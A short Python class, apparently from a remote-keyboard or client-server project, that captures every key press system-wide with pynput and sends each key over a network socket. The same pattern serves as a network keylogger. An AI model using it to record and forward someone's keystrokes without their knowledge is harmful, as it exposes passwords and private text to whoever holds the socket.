import time
from pynput.keyboard import Listener


class virtual_keyboard:

    def __init__(self, send_socket):
        self.send_socket = send_socket

    def on_press(self, key):
        try:
            self.send_socket.send(format(key).encode())
        except OSError:  # in case server hangs up before client realises
            return False  # end listener

    def listen(self):
        with Listener(on_press=self.on_press) as listener:
            time.sleep(10)
            listener.join()
